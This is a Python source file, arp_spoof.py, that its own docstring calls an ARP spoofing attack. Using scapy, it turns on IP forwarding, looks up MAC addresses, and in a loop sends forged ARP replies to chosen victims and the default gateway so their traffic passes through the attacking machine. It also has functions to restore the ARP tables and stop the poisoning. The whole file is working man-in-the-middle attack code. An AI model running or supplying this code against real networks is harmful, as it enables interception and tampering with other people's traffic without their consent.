#!/usr/bin/python
# Filename: arp_spoof.py

'''
This module perform arp spoofing attack.
'''

import logging
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
from scapy.all import *


def ip_forward():
    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '1\n':
        ipf.write('1\n')
        ipf.close()

def stop_ip_forward():
    ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
    ipf_read = ipf.read()
    if ipf_read != '0\n':
        ipf.write('0\n')
    ipf.close()

def origin_mac(ip):
    ans,unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=0)
    for s,r in ans:
        mac = r[Ether].src
        return r[Ether].src

def arp_poison(router_ip, victim_ip, router_mac, victim_mac):
    try:
        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac), count=1, verbose=0)
        #threading.Thread(send(ARP(op=2, pdst=victim, psrc=router, hwdst=victimMAC), count=3, verbose=0)).start()
        logging.info('arp sent to %s' % victim_ip)
        #os.system('echo 'ARP packet sent' >> logfile2.log')
        
        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac), count=1, verbose=0) 
        #threading.Thread(send(ARP(op=2, pdst=router, psrc=victim, hwdst=routerMAC), count=3, verbose=0)).start()
        logging.info('arp sent to %s' % router_ip)
    except:
        sys.exit(1)

def restore(router_ip, victim_ip, router_mac, victim_mac):
    send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=victim_mac), count=3, verbose=0)
    print 'Sending to Gateway %s:   %s <--> %s' % (router_ip, victim_ip, victim_mac)
    send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=router_mac), count=3, verbose=0)
    print 'Sending to Victim  %s:   %s <--> %s' % (victim_ip, router_ip, router_mac)



def arp_poisoning_call():
    if running:
        #while True:
        for ip, mac in zip(victims, victims_mac):
            threading.Thread(target=arp_poison,args=(default_gw, ip, gw_mac_address, mac)).start()
        time.sleep(0.5)
    root.after(1000, arp_poisoning_call)

def start_arp_poisoning():
    '''Enable scanning by setting the global flag to True.'''
    global running
    running = True

    ip_forward()
    root.after(500, arp_poisoning_call)  # After 1/2 second, call arp_poisoning_call

def stop_arp_poisoning():
    '''Stop scanning by setting the global flag to False.'''
    global running
    running = False

    print '\033[32mTurning off ip forwarding\033[37m'
    stop_ip_forward()
    print '\r\033[31mStopping ARP Poisoning\033[37m'  

